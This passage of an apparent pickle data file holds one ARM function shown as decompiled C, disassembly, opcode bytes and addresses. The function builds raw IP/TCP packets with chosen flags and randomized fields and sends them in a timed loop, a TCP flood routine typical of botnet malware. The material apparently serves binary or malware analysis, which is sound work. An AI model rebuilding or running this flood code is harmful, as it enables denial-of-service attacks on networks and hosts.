| 5;\u000a      *local_5c = local_68;\u000a      local_70 = *local_5c & 0x4f | 0x40;\u000a      *local_5c = local_70;\u000a      local_c8[iVar3 + 1] = 0;\u000a      *(short *)(local_c8 + iVar3 + 2) = (short)(((local_50 & 0xffff) + 0x14) * 0x10000 >> 0x10);\u000a      local_28 = local_5c;\u000a      local_1c = local_5c;\u000a      uVar1 = FUN_0000b2a4();\u000a      *(undefined2 *)(local_1c + 4) = uVar1;\u000a      *(undefined2 *)(local_1c + 6) = 0;\u000a      local_1c[8] = 0xff;\u000a      local_1c[9] = 6;\u000a      *(undefined2 *)(local_1c + 10) = 0;\u000a      *(undefined4 *)(local_1c + 0xc) = *(undefined4 *)PTR_DAT_0000ade8;\u000a      *(in_addr_t *)(local_1c + 0x10) = local_34;\u000a      uVar1 = FUN_0000b2a4();\u000a      *local_18 = uVar1;\u000a      uVar4 = FUN_0000b2a4();\u000a      *(undefined4 *)(local_18 + 2) = uVar4;\u000a      *(undefined4 *)(local_18 + 4) = 0;\u000a      local_78 = *(byte *)(local_18 + 6) & 0x5f | 0x50;\u000a      *(byte *)(local_18 + 6) = local_78;\u000a      if (param_5 == PTR_DAT_0000adec) {\u000a        local_80 = *(byte *)((int)local_18 + 0xd) | 0x20;\u000a        *(byte *)((int)local_18 + 0xd) = local_80;\u000a      }\u000a      else {\u000a        if (param_5 == PTR_DAT_0000adf0) {\u000a          local_88 = *(byte *)((int)local_18 + 0xd) | 0x10;\u000a          *(byte *)((int)local_18 + 0xd) = local_88;\u000a        }\u000a        else {\u000a          if (param_5 == PTR_DAT_0000adf4) {\u000a            local_90 = *(byte *)((int)local_18 + 0xd) | 4;\u000a            *(byte *)((int)local_18 + 0xd) = local_90;\u000a          }\u000a          else {\u000a            if (param_5 == PTR_DAT_0000adf8) {\u000a              local_98 = *(byte *)((int)local_18 + 0xd) | 1;\u000a              *(byte *)((int)local_18 + 0xd) = local_98;\u000a            }\u000a            else {\u000a              if (param_5 == PTR_DAT_0000adfc) {\u000a                local_a0 = *(byte *)((int)local_18 + 0xd) | 8;\u000a                *(byte *)((int)local_18 + 0xd) = local_a0;\u000a              }\u000a              else {\u000a                local_a8 = *(byte *)((int)local_18 + 0xd) | 0x20;\u000a                *(byte *)((int)local_18 + 0xd) = local_a8;\u000a                local_b0 = *(byte *)((int)local_18 + 0xd) | 0x10;\u000a                *(byte *)((int)local_18 + 0xd) = local_b0;\u000a                local_b8 = *(byte *)((int)local_18 + 0xd) | 1;\u000a                *(byte *)((int)local_18 + 0xd) = local_b8;\u000a                local_c0 = *(byte *)((int)local_18 + 0xd) | 8;\u000a                *(byte *)((int)local_18 + 0xd) = local_c0;\u000a                local_c8[0] = *(byte *)((int)local_18 + 0xd) | 4;\u000a                *(byte *)((int)local_18 + 0xd) = local_c8[0];\u000a              }\u000a            }\u000a          }\u000a        }\u000a      }\u000a      uVar1 = FUN_0000b2a4();\u000a      local_18[7] = uVar1;\u000a      local_18[8] = 0;\u000a      local_18[9] = 0;\u000a      if (local_48 == 0) {\u000a        local_58 = FUN_0000b2a4();\u000a        local_58 = local_58 & 0xffff;\u000a      }\u000a      else {\u000a        uVar2 = htons((short)local_48,(&stack0xffffff30)[iVar3]);\u000a        local_58 = (uint)uVar2;\u000a      }\u000a      local_18[1] = (short)local_58;\u000a      uVar2 = htons(0x28,(&stack0xffffff30)[iVar3]);\u000a      uVar1 = FUN_00008da4(local_1c,local_18,(uint)uVar2,local_50 + 0x14);\u000a      local_18[8] = uVar1;\u000a      uVar1 = FUN_00008ccc(local_28,(uint)*(ushort *)(local_1c + 2));\u000a      *(undefined2 *)(local_1c + 10) = uVar1;\u000a      local_14 = time(0,(&stack0xffffff30)[iVar3]);\u000a      do {\u000a        *(undefined4 *)(local_1c + 0xc) = *(undefined4 *)PTR_DAT_0000ade8;\u000a        uVar1 = FUN_0000b2a4();\u000a        *(undefined2 *)(local_1c + 4) = uVar1;\u000a        uVar4 = FUN_0000b2a4();\u000a        *(undefined4 *)(local_18 + 2) = uVar4;\u000a        uVar1 = FUN_0000b2a4();\u000a        *local_18 = uVar1;\u000a        local_18[8] = 0;\u000a        uVar2 = htons(0x28,(&stack0xffffff30)[iVar3]);\u000a        uVar1 = FUN_00008da4(local_1c,local_18,(uint)uVar2,local_50 + 0x14);\u000a        local_18[8] = uVar1;\u000a        uVar1 = FUN_00008ccc(local_28,(uint)*(ushort *)(local_1c + 2));\u000a        *(undefined2 *)(local_1c + 10) = uVar1;\u000a        *(undefined2 **)(&stack0xffffff30 + iVar3) = &local_38;\u000a        *(socklen_t *)((int)&sStack204 + iVar3) = 0x10;\u000a        sendto(local_24,local_28,local_60,0,*(sockaddr **)(&stack0xffffff30 + iVar3),\u000a               *(socklen_t *)((int)&sStack204 + iVar3));\u000a        tVar5 = time(0,(&stack0xffffff30)[iVar3]);\u000a      } while (tVar5 < local_14 + local_4c);\u000a      close(local_24,(&stack0xffffff30)[iVar3]);\u000a                    /* WARNING: Subroutine does not return */\u000a      exit(0,(&stack0xffffff30)[iVar3]);\u000a    }\u000a  }\u000a  return;\u000a}\u000a\u000a
p234
S'cpy r12,sp\nstmdb sp!,{ r11 r12 lr pc}\nsub r11,r12,#0x4\nsub sp,sp,#0xc0\nstr r0,[r11,#-0x40]\nstr r1,[r11,#-0x44]\nstr r2,[r11,#-0x48]\nstr r3,[r11,#-0x4c]\ncpy r3,sp\nstr r3,[r11,#-0x50]\nmov r3,#0x2\nstrh r3,[r11,#-0x34]\nldr r3,[r11,#-0x44]\ncmp r3,#0x0\nbne 0x0000a7f8\nbl 0x0000b2a4\ncpy r3,r0\nmov r3,r3, lsl #0x10\nmov r3,r3, lsr #0x10\nstrh r3,[r11,#-0x32]\nb 0x0000a814\nldr r3,[r11,#-0x44]\nmov r3,r3, lsl #0x10\nmov r3,r3, lsr #0x10\ncpy r0,r3\nbl 0x00008b54\ncpy r3,r0\nstrh r3,[r11,#-0x32]\nldr r3,[r11,#-0x40]\ncpy r0,r3\nbl 0x00008a94\ncpy r3,r0\nstr r3,[r11,#-0x30]\nmov r0,#0x2\nmov r1,#0x3\nmov r2,#0x6\nbl 0x00008a28\ncpy r3,r0\nstr r3,[r11,#-0x20]\nldr r3,[r11,#-0x20]\ncmp r3,#0x0\nbeq 0x0000add8\nmov r3,#0x1\nstr r3,[r11,#-0x38]\nsub r12,r11,#0x38\nmov r3,#0x4\nstr r3,[sp,#0x0]\nldr r0,[r11,#-0x20]\nmov r1,#0x0\nmov r2,#0x3\ncpy r3,r12\nbl 0x00008aa0\ncpy r3,r0\ncmp r3,#0x0\nblt 0x0000add8\nldr r3,[r11,#-0x4c]\nadd r3,r3,#0x28\nstr r3,[r11,#-0x5c]\nldr r3,[r11,#-0x5c]\nadd r3,r3,#0x7\nadd r3,r3,#0x7\nmov r3,r3, lsr #0x3\nmov r3,r3, lsl #0x3\nrsb sp,r3,sp\nadd r1,sp,#0x8\nstr r1,[r11,#-0x58]\nldr r2,[r11,#-0x58]\nadd r3,r2,#0x7\nmov r3,r3, lsr #0x3\nmov r3,r3, lsl #0x3\nstr r3,[r11,#-0x58]\nldr r3,[r11,#-0x58]\nstr r3,[r11,#-0x24]\nldr r3,[r11,#-0x24]\nstr r3,[r11,#-0x18]\nldr r3,[r11,#-0x18]\nadd r3,r3,#0x14\nstr r3,[r11,#-0x14]\nldr r2,[r11,#-0x18]\nldrb r1,[r2,#0x0]\nstrb r1,[r11,#-0x64]\nldrb r1,[r11,#-0x64]\nbic r3,r1,#0xa\norr r3,r3,#0x5\nstrb r3,[r11,#-0x64]\nldrb r3,[r11,#-0x64]\nstrb r3,[r2,#0x0]\nldr r2,[r11,#-0x18]\nldrb r1,[r2,#0x0]\nstrb r1,[r11,#-0x6c]\nldrb r1,[r11,#-0x6c]\nbic r3,r1,#0xb0\norr r3,r3,#0x40\nstrb r3,[r11,#-0x6c]\nldrb r3,[r11,#-0x6c]\nstrb r3,[r2,#0x0]\nldr r2,[r11,#-0x18]\nmov r3,#0x0\nstrb r3,[r2,#0x1]\nldr r3,[r11,#-0x4c]\nmov r3,r3, lsl #0x10\nmov r3,r3, lsr #0x10\nadd r3,r3,#0x14\nmov r3,r3, lsl #0x10\nmov r2,r3, lsr #0x10\nldr r3,[r11,#-0x18]\nstrh r2,[r3,#0x2]\nbl 0x0000b2a4\ncpy r3,r0\nmov r3,r3, lsl #0x10\nmov r2,r3, lsr #0x10\nldr r3,[r11,#-0x18]\nstrh r2,[r3,#0x4]\nldr r2,[r11,#-0x18]\nmov r3,#0x0\nstrh r3,[r2,#0x6]\nldr r2,[r11,#-0x18]\nmvn r3,#0x0\nstrb r3,[r2,#0x8]\nldr r2,[r11,#-0x18]\nmov r3,#0x6\nstrb r3,[r2,#0x9]\nldr r2,[r11,#-0x18]\nmov r3,#0x0\nstrh r3,[r2,#0xa]\nldr r3,[0xade8]\nldr r2,[r3,#0x0]\nldr r3,[r11,#-0x18]\nstr r2,[r3,#0xc]\nldr r2,[r11,#-0x30]\nldr r3,[r11,#-0x18]\nstr r2,[r3,#0x10]\nbl 0x0000b2a4\ncpy r3,r0\nmov r3,r3, lsl #0x10\nmov r2,r3, lsr #0x10\nldr r3,[r11,#-0x14]\nstrh r2,[r3,#0x0]\nbl 0x0000b2a4\ncpy r2,r0\nldr r3,[r11,#-0x14]\nstr r2,[r3,#0x4]\nldr r2,[r11,#-0x14]\nmov r3,#0x0\nstr r3,[r2,#0x8]\nldr r2,[r11,#-0x14]\nldrb r1,[r2,#0xc]\nstrb r1,[r11,#-0x74]\nldrb r1,[r11,#-0x74]\nbic r3,r1,#0xa0\norr r3,r3,#0x50\nstrb r3,[r11,#-0x74]\nldrb r3,[r11,#-0x74]\nstrb r3,[r2,#0xc]\nldr r2,[r11,#0x4]\nldr r3,[0xadec]\ncmp r2,r3\nbne 0x0000aa44\nldr r3,[r11,#-0x14]\nldrb r1,[r3,#0xd]\nstrb r1,[r11,#-0x7c]\nldrb r1,[r11,#-0x7c]\ncpy r2,r1\norr r2,r2,#0x20\nstrb r2,[r11,#-0x7c]\nldrb r2,[r11,#-0x7c]\nstrb r2,[r3,#0xd]\nb 0x0000abd8\nldr r2,[r11,#0x4]\nldr r3,[0xadf0]\ncmp r2,r3\nbne 0x0000aa7c\nldr r3,[r11,#-0x14]\nldrb r1,[r3,#0xd]\nstrb r1,[r11,#-0x84]\nldrb r1,[r11,#-0x84]\ncpy r2,r1\norr r2,r2,#0x10\nstrb r2,[r11,#-0x84]\nldrb r2,[r11,#-0x84]\nstrb r2,[r3,#0xd]\nb 0x0000abd8\nldr r2,[r11,#0x4]\nldr r3,[0xadf4]\ncmp r2,r3\nbne 0x0000aab4\nldr r3,[r11,#-0x14]\nldrb r1,[r3,#0xd]\nstrb r1,[r11,#-0x8c]\nldrb r1,[r11,#-0x8c]\ncpy r2,r1\norr r2,r2,#0x4\nstrb r2,[r11,#-0x8c]\nldrb r2,[r11,#-0x8c]\nstrb r2,[r3,#0xd]\nb 0x0000abd8\nldr r2,[r11,#0x4]\nldr r3,[0xadf8]\ncmp r2,r3\nbne 0x0000aaec\nldr r3,[r11,#-0x14]\nldrb r1,[r3,#0xd]\nstrb r1,[r11,#-0x94]\nldrb r1,[r11,#-0x94]\ncpy r2,r1\norr r2,r2,#0x1\nstrb r2,[r11,#-0x94]\nldrb r2,[r11,#-0x94]\nstrb r2,[r3,#0xd]\nb 0x0000abd8\nldr r2,[r11,#0x4]\nldr r3,[0xadfc]\ncmp r2,r3\nbne 0x0000ab24\nldr r3,[r11,#-0x14]\nldrb r1,[r3,#0xd]\nstrb r1,[r11,#-0x9c]\nldrb r1,[r11,#-0x9c]\ncpy r2,r1\norr r2,r2,#0x8\nstrb r2,[r11,#-0x9c]\nldrb r2,[r11,#-0x9c]\nstrb r2,[r3,#0xd]\nb 0x0000abd8\nldr r2,[r11,#-0x14]\nldrb r3,[r2,#0xd]\nstrb r3,[r11,#-0xa4]\nldrb r1,[r11,#-0xa4]\ncpy r3,r1\norr r3,r3,#0x20\nstrb r3,[r11,#-0xa4]\nldrb r3,[r11,#-0xa4]\nstrb r3,[r2,#0xd]\nldr r2,[r11,#-0x14]\nldrb r1,[r2,#0xd]\nstrb r1,[r11,#-0xac]\nldrb r1,[r11,#-0xac]\ncpy r3,r1\norr r3,r3,#0x10\nstrb r3,[r11,#-0xac]\nldrb r3,[r11,#-0xac]\nstrb r3,[r2,#0xd]\nldr r2,[r11,#-0x14]\nldrb r1,[r2,#0xd]\nstrb r1,[r11,#-0xb4]\nldrb r1,[r11,#-0xb4]\ncpy r3,r1\norr r3,r3,#0x1\nstrb r3,[r11,#-0xb4]\nldrb r3,[r11,#-0xb4]\nstrb r3,[r2,#0xd]\nldr r2,[r11,#-0x14]\nldrb r1,[r2,#0xd]\nstrb r1,[r11,#-0xbc]\nldrb r1,[r11,#-0xbc]\ncpy r3,r1\norr r3,r3,#0x8\nstrb r3,[r11,#-0xbc]\nldrb r3,[r11,#-0xbc]\nstrb r3,[r2,#0xd]\nldr r2,[r11,#-0x14]\nldrb r1,[r2,#0xd]\nstrb r1,[r11,#-0xc4]\nldrb r1,[r11,#-0xc4]\ncpy r3,r1\norr r3,r3,#0x4\nstrb r3,[r11,#-0xc4]\nldrb r3,[r11,#-0xc4]\nstrb r3,[r2,#0xd]\nbl 0x0000b2a4\ncpy r3,r0\nmov r3,r3, lsl #0x10\nmov r2,r3, lsr #0x10\nldr r3,[r11,#-0x14]\nstrh r2,[r3,#0xe]\nldr r2,[r11,#-0x14]\nmov r3,#0x0\nstrh r3,[r2,#0x10]\nldr r2,[r11,#-0x14]\nmov r3,#0x0\nstrh r3,[r2,#0x12]\nldr r3,[r11,#-0x44]\ncmp r3,#0x0\nbne 0x0000ac2c\nbl 0x0000b2a4\ncpy r3,r0\nmov r3,r3, lsl #0x10\nmov r3,r3, lsr #0x10\nstr r3,[r11,#-0x54]\nb 0x0000ac48\nldr r3,[r11,#-0x44]\nmov r3,r3, lsl #0x10\nmov r3,r3, lsr #0x10\ncpy r0,r3\nbl 0x00008b54\ncpy r3,r0\nstr r3,[r11,#-0x54]\nldr r3,[r11,#-0x14]\nldr r1,[r11,#-0x54]\nstrh r1,[r3,#0x2]\nmov r0,#0x28\nbl 0x00008b54\ncpy r3,r0\ncpy r2,r3\nldr r3,[r11,#-0x4c]\nadd r3,r3,#0x14\nldr r0,[r11,#-0x18]\nldr r1,[r11,#-0x14]\nbl 0x00008da4\ncpy r3,r0\ncpy r2,r3\nldr r3,[r11,#-0x14]\nstrh r2,[r3,#0x10]\nldr r3,[r11,#-0x24]\ncpy r2,r3\nldr r3,[r11,#-0x18]\nldrh r3,[r3,#0x2]\ncpy r0,r2\ncpy r1,r3\nbl 0x00008ccc\ncpy r3,r0\ncpy r2,r3\nldr r3,[r11,#-0x18]\nstrh r2,[r3,#0xa]\nmov r0,#0x0\nbl 0x00008b30\ncpy r3,r0\nstr r3,[r11,#-0x10]\nldr r3,[0xade8]\nldr r2,[r3,#0x0]\nldr r3,[r11,#-0x18]\nstr r2,[r3,#0xc]\nbl 0x0000b2a4\ncpy r3,r0\nmov r3,r3, lsl #0x10\nmov r2,r3, lsr #0x10\nldr r3,[r11,#-0x18]\nstrh r2,[r3,#0x4]\nbl 0x0000b2a4\ncpy r2,r0\nldr r3,[r11,#-0x14]\nstr r2,[r3,#0x4]\nbl 0x0000b2a4\ncpy r3,r0\nmov r3,r3, lsl #0x10\nmov r2,r3, lsr #0x10\nldr r3,[r11,#-0x14]\nstrh r2,[r3,#0x0]\nldr r2,[r11,#-0x14]\nmov r3,#0x0\nstrh r3,[r2,#0x10]\nmov r0,#0x28\nbl 0x00008b54\ncpy r3,r0\ncpy r2,r3\nldr r3,[r11,#-0x4c]\nadd r3,r3,#0x14\nldr r0,[r11,#-0x18]\nldr r1,[r11,#-0x14]\nbl 0x00008da4\ncpy r3,r0\ncpy r2,r3\nldr r3,[r11,#-0x14]\nstrh r2,[r3,#0x10]\nldr r3,[r11,#-0x24]\ncpy r2,r3\nldr r3,[r11,#-0x18]\nldrh r3,[r3,#0x2]\ncpy r0,r2\ncpy r1,r3\nbl 0x00008ccc\ncpy r3,r0\ncpy r2,r3\nldr r3,[r11,#-0x18]\nstrh r2,[r3,#0xa]\nldr r2,[r11,#-0x24]\nsub r3,r11,#0x34\nstr r3,[sp,#0x0]\nmov r3,#0x10\nstr r3,[sp,#0x4]\nldr r0,[r11,#-0x20]\ncpy r1,r2\nldr r2,[r11,#-0x5c]\nmov r3,#0x0\nbl 0x00008adc\nmov r0,#0x0\nbl 0x00008b30\ncpy r1,r0\nldr r2,[r11,#-0x10]\nldr r3,[r11,#-0x48]\nadd r3,r2,r3\ncmp r1,r3\nblt 0x0000acc4\nldr r0,[r11,#-0x20]\nbl 0x00008bcc\nmov r0,#0x0\nbl 0x00008b6c\nldr sp,[r11,#-0x50]\nsub sp,r11,#0xc\nldmia sp,{ r11 sp lr }\nbx lr\n'
p235
S'0d c0 a0 e1\n00 d8 2d e9\n04 b0 4c e2\nc0 d0 4d e2\n40 00 0b e5\n44 10 0b e5\n48 20 0b e5\n4c 30 0b e5\n0d 30 a0 e1\n50 30 0b e5\n02 30 a0 e3\nb4 33 4b e1\n44 30 1b e5\n00 00 53 e3\n05 00 00 1a\naf 02 00 eb\n00 30 a0 e1\n03 38 a0 e1\n23 38 a0 e1\nb2 33 4b e1\n06 00 00 ea\n44 30 1b e5\n03 38 a0 e1\n23 38 a0 e1\n03 00 a0 e1\nd1 f8 ff eb\n00 30 a0 e1\nb2 33 4b e1\n40 30 1b e5\n03 00 a0 e1\n9c f8 ff eb\n00 30 a0 e1\n30 30 0b e5\n02 00 a0 e3\n03 10 a0 e3\n06 20 a0 e3\n7b f8 ff eb\n00 30 a0 e1\n20 30 0b e5\n20 30 1b e5\n00 00 53 e3\n62 01 00 0a\n01 30 a0 e3\n38 30 0b e5\n38 c0 4b e2\n04 30 a0 e3\n00 30 8d e5\n20 00 1b e5\n00 10 a0 e3\n03 20 a0 e3\n0c 30 a0 e1\n8a f8 ff eb\n00 30 a0 e1\n00 00 53 e3\n55 01 00 ba\n4c 30 1b e5\n28 30 83 e2\n5c 30 0b e5\n5c 30 1b e5\n07 30 83 e2\n07 30 83 e2\na3 31 a0 e1\n83 31 a0 e1\n0d d0 63 e0\n08 10 8d e2\n58 10 0b e5\n58 20 1b e5\n07 30 82 e2\na3 31 a0 e1\n83 31 a0 e1\n58 30 0b e5\n58 30 1b e5\n24 30 0b e5\n24 30 1b e5\n18 30 0b e5\n18 30 1b e5\n14 30 83 e2\n14 30 0b e5\n18 20 1b e5\n00 10 d2 e5\n64 10 4b e5\n64 10 5b e5\n0a 30 c1 e3\n05 30 83 e3\n64 30 4b e5\n64 30 5b e5\n00 30 c2 e5\n18 20 1b e5\n00 10 d2 e5\n6c 10 4b e5\n6c 10 5b e5\nb0 30 c1 e3\n40 30 83 e3\n6c 30 4b e5\n6c 30 5b e5\n00 30 c2 e5\n18 20 1b e5\n00 30 a0 e3\n01 30 c2 e5\n4c 30 1b e5\n03 38 a0 e1\n23 38 a0 e1\n14 30 83 e2\n03 38 a0 e1\n23 28 a0 e1\n18 30 1b e5\nb2 20 c3 e1\n53 02 00 eb\n00 30 a0 e1\n03 38 a0 e1\n23 28 a0 e1\n18 30 1b e5\nb4 20 c3 e1\n18 20 1b e5\n00 30 a0 e3\nb6 30 c2 e1\n18 20 1b e5\n00 30 e0 e3\n08 30 c2 e5\n18 20 1b e5\n06 30 a0 e3\n09 30 c2 e5\n18 20 1b e5\n00 30 a0 e3\nba 30 c2 e1\n48 34 9f e5\n00 20 93 e5\n18 30 1b e5\n0c 20 83 e5\n30 20 1b e5\n18 30 1b e5\n10 20 83 e5\n3a 02 00 eb\n00 30 a0 e1\n03 38 a0 e1\n23 28 a0 e1\n14 30 1b e5\nb0 20 c3 e1\n34 02 00 eb\n00 20 a0 e1\n14 30 1b e5\n04 20 83 e5\n14 20 1b e5\n00 30 a0 e3\n08 30 82 e5\n14 20 1b e5\n0c 10 d2 e5\n74 10 4b e5\n74 10 5b e5\na0 30 c1 e3\n50 30 83 e3\n74 30 4b e5\n74 30 5b e5\n0c 30 c2 e5\n04 20 9b e5\nd4 33 9f e5\n03 00 52 e1\n09 00 00 1a\n14 30 1b e5\n0d 10 d3 e5\n7c 10 4b e5\n7c 10 5b e5\n01 20 a0 e1\n20 20 82 e3\n7c 20 4b e5\n7c 20 5b e5\n0d 20 c3 e5\n64 00 00 ea\n04 20 9b e5\na0 33 9f e5\n03 00 52 e1\n09 00 00 1a\n14 30 1b e5\n0d 10 d3 e5\n84 10 4b e5\n84 10 5b e5\n01 20 a0 e1\n10 20 82 e3\n84 20 4b e5\n84 20 5b e5\n0d 20 c3 e5\n56 00 00 ea\n04 20 9b e5\n6c 33 9f e5\n03 00 52 e1\n09 00 00 1a\n14 30 1b e5\n0d 10 d3 e5\n8c 10 4b e5\n8c 10 5b e5\n01 20 a0 e1\n04 20 82 e3\n8c 20 4b e5\n8c 20 5b e5\n0d 20 c3 e5\n48 00 00 ea\n04 20 9b e5\n38 33 9f e5\n03 00 52 e1\n09 00 00 1a\n14 30 1b e5\n0d 10 d3 e5\n94 10 4b e5\n94 10 5b e5\n01 20 a0 e1\n01 20 82 e3\n94 20 4b e5\n94 20 5b e5\n0d 20 c3 e5\n3a 00 00 ea\n04 20 9b e5\n04 33 9f e5\n03 00 52 e1\n09 00 00 1a\n14 30 1b e5\n0d 10 d3 e5\n9c 10 4b e5\n9c 10 5b e5\n01 20 a0 e1\n08 20 82 e3\n9c 20 4b e5\n9c 20 5b e5\n0d 20 c3 e5\n2c 00 00 ea\n14 20 1b e5\n0d 30 d2 e5\na4 30 4b e5\na4 10 5b e5\n01 30 a0 e1\n20 30 83 e3\na4 30 4b e5\na4 30 5b e5\n0d 30 c2 e5\n14 20 1b e5\n0d 10 d2 e5\nac 10 4b e5\nac 10 5b e5\n01 30 a0 e1\n10 30 83 e3\nac 30 4b e5\nac 30 5b e5\n0d 30 c2 e5\n14 20 1b e5\n0d 10 d2 e5\nb4 10 4b e5\nb4 10 5b e5\n01 30 a0 e1\n01 30 83 e3\nb4 30 4b e5\nb4 30 5b e5\n0d 30 c2 e5\n14 20 1b e5\n0d 10 d2 e5\nbc 10 4b e5\nbc 10 5b e5\n01 30 a0 e1\n08 30 83 e3\nbc 30 4b e5\nbc 30 5b e5\n0d 30 c2 e5\n14 20 1b e5\n0d 10 d2 e5\nc4 10 4b e5\nc4 10 5b e5\n01 30 a0 e1\n04 30 83 e3\nc4 30 4b e5\nc4 30 5b e5\n0d 30 c2 e5\nb1 01 00 eb\n00 30 a0 e1\n03 38 a0 e1\n23 28 a0 e1\n14 30 1b e5\nbe 20 c3 e1\n14 20 1b e5\n00 30 a0 e3\nb0 31 c2 e1\n14 20 1b e5\n00 30 a0 e3\nb2 31 c2 e1\n44 30 1b e5\n00 00 53 e3\n05 00 00 1a\na2 01 00 eb\n00 30 a0 e1\n03 38 a0 e1\n23 38 a0 e1\n54 30 0b e5\n06 00 00 ea\n44 30 1b e5\n03 38 a0 e1\n23 38 a0 e1\n03 00 a0 e1\nc4 f7 ff eb\n00 30 a0 e1\n54 30 0b e5\n14 30 1b e5\n54 10 1b e5\nb2 10 c3 e1\n28 00 a0 e3\nbd f7 ff eb\n00 30 a0 e1\n03 20 a0 e1\n4c 30 1b e5\n14 30 83 e2\n18 00 1b e5\n14 10 1b e5\n4a f8 ff eb\n00 30 a0 e1\n03 20 a0 e1\n14 30 1b e5\nb0 21 c3 e1\n24 30 1b e5\n03 20 a0 e1\n18 30 1b e5\nb2 30 d3 e1\n02 00 a0 e1\n03 10 a0 e1\n09 f8 ff eb\n00 30 a0 e1\n03 20 a0 e1\n18 30 1b e5\nba 20 c3 e1\n00 00 a0 e3\n9c f7 ff eb\n00 30 a0 e1\n10 30 0b e5\n1c 31 9f e5\n00 20 93 e5\n18 30 1b e5\n0c 20 83 e5\n72 01 00 eb\n00 30 a0 e1\n03 38 a0 e1\n23 28 a0 e1\n18 30 1b e5\nb4 20 c3 e1\n6c 01 00 eb\n00 20 a0 e1\n14 30 1b e5\n04 20 83 e5\n68 01 00 eb\n00 30 a0 e1\n03 38 a0 e1\n23 28 a0 e1\n14 30 1b e5\nb0 20 c3 e1\n14 20 1b e5\n00 30 a0 e3\nb0 31 c2 e1\n28 00 a0 e3\n8a f7 ff eb\n00 30 a0 e1\n03 20 a0 e1\n4c 30 1b e5\n14 30 83 e2\n18 00 1b e5\n14 10 1b e5\n17 f8 ff eb\n00 30 a0 e1\n03 20 a0 e1\n14 30 1b e5\nb0 21 c3 e1\n24 30 1b e5\n03 20 a0 e1\n18 30 1b e5\nb2 30 d3 e1\n02 00 a0 e1\n03 10 a0 e1\nd6 f7 ff eb\n00 30 a0 e1\n03 20 a0 e1\n18 30 1b e5\nba 20 c3 e1\n24 20 1b e5\n34 30 4b e2\n00 30 8d e5\n10 30 a0 e3\n04 30 8d e5\n20 00 1b e5\n02 10 a0 e1\n5c 20 1b e5\n00 30 a0 e3\n4c f7 ff eb\n00 00 a0 e3\n5f f7 ff eb\n00 10 a0 e1\n10 20 1b e5\n48 30 1b e5\n03 30 82 e0\n03 00 51 e1\nbe ff ff ba\n20 00 1b e5\n7e f7 ff eb\n00 00 a0 e3\n64 f7 ff eb\n50 d0 1b e5\n0c d0 4b e2\n00 68 9d e8\n1e ff 2f e1\n'
p236
S'.text:0000a7a4\n.text:0000a7a8\n.text:0000a7ac\n.text:0000a7b0\n.text:0000a7b4\n.text:0000a7b8\n.text:0000a7bc\n.text:0000a7c0\n.text:0000a7c4\n.text:0000a7c8\n.text:0000a7cc\n.text:0000a7d0\n.text:0000a7d4\n.text:0000a7d8\n.text:0000a7dc\n.text:0000a7e0\n.text:0000a7e4\n.text:0000a7e8\n.text:0000a7ec\n.text:0000a7f0\n.text:0000a7f4\n.text:0000a7f8\n.text:0000a7fc\n.text:0000a800\n.text:0000a804\n.text:0000a808\n.text:0000a80c\n.text:0000a810\n.text:0000a814\n.text:0000a818\n.text:0000a81c\n.text:0000a820\n.text:0000a824\n.text:0000a828\n.text:0000a82c\n.text:0000a830\n.text:0000a834\n.text:0000a838\n.text:0000a83c\n.text:0000a840\n.text:0000a844\n.text:0000a848\n.text:0000a84c\n.text:0000a850\n.text:0000a854\n.text:0000a858\n.text:0000a85c\n.text:0000a860\n.text:0000a864\n.text:0000a868\n.text:0000a86c\n.text:0000a870\n.text:0000a874\n.text:0000a878\n.text:0000a87c\n.text:0000a880\n.text:0000a884\n.text:0000a888\n.text:0000a88c\n.text:0000a890\n.text:0000a894\n.text:0000a898\n.text:0000a89c\n.text:0000a8a0\n.text:0000a8a4\n.text:0000a8a8\n.text:0000a8ac\n.text:0000a8b0\n.text:0000a8b4\n.text:0000a8b8\n.text:0000a8bc\n.text:0000a8c0\n.text:0000a8c4\n.text:0000a8c8\n.text:0000a8cc\n.text:0000a8d0\n.text:0000a8d4\n.text:0000a8d8\n.text:0000a8dc\n.text:0000a8e0\n.text:0000a8e4\n.text:0000a8e8\n.text:0000a8ec\n.text:0000a8f0\n.text:0000a8f4\n.text:0000a8f8\n.text:0000a8fc\n.text:0000a900\n.text:0000a904\n.text:0000a908\n.text:0000a90c\n.text:0000a910\n.text:0000a914\n.text:0000a918\n.text:0000a91c\n.text:0000a920\n.text:0000a924\n.text:0000a928\n.text:0000a92c\n.text:0000a930\n.text:0000a934\n.text:0000a938\n.text:0000a93c\n.text:0000a940\n.text:0000a944\n.text:0000a948\n.text:0000a94c\n.text:0000a950\n.text:0000a954\n.text:0000a958\n.text:0000a95c\n.text:0000a960\n.text:0000a964\n.text:0000a968\n.text:0000a96c\n.text:0000a970\n.text:0000a974\n.text:0000a978\n.text:0000a97c\n.text:0000a980\n.text:0000a984\n.text:0000a988\n.text:0000a98c\n.text:0000a990\n.text:0000a994\n.text:0000a998\n.text:0000a99c\n.text:0000a9a0\n.text:0000a9a4\n.text:0000a9a8\n.text:0000a9ac\n.text:0000a9b0\n.text:0000a9b4\n.text:0000a9b8\n.text:0000a9bc\n.text:0000a9c0\n.text:0000a9c4\n.text:0000a9c8\n.text:0000a9cc\n.text:0000a9d0\n.text:0000a9d4\n.text:0000a9d8\n.text:0000a9dc\n.text:0000a9e0\n.text:0000a9e4\n.text:0000a9e8\n.text:0000a9ec\n.text:0000a9f0\n.text:0000a9f4\n.text:0000a9f8\n.text:0000a9fc\n.text:0000aa00\n.text:0000aa04\n.text:0000aa08\n.text:0000aa0c\n.text:0000aa10\n.text:0000aa14\n.text:0000aa18\n.text:0000aa1c\n.text:0000aa20\n.text:0000aa24\n.text:0000aa28\n.text:0000aa2c\n.text:0000aa30\n.text:0000aa34\n.text:0000aa38\n.text:0000aa3c\n.text:0000aa40\n.text:0000aa44\n.text:0000aa48\n.text:0000aa4c\n.text:0000aa50\n.text:0000aa54\n.text:0000aa58\n.text:0000aa5c\n.text:0000aa60\n.text:0000aa64\n.text:0000aa68\n.text:0000aa6c\n.text:0000aa70\n.text:0000aa74\n.text:0000aa78\n.text:0000aa7c\n.text:0000aa80\n.text:0000aa84\n.text:0000aa88\n.text:0000aa8c\n.text:0000aa90\n.text:0000aa94\n.text:0000aa98\n.text:0000aa9c\n.text:0000aaa0\n.text:0000aaa4\n.text:0000aaa8\n.text:0000aaac\n.text:0000aab0\n.text:0000aab4\n.text:0000aab8\n.text:0000aabc\n.text:0000aac0\n.text:0000aac4\n.text:0000aac8\n.text:0000aacc\n.text:0000aad0\n.text:0000aad4\n.text:0000aad8\n.text:0000aadc\n.text:0000aae0\n.text:0000aae4\n.text:0000aae8\n.text:0000aaec\n.text:0000aa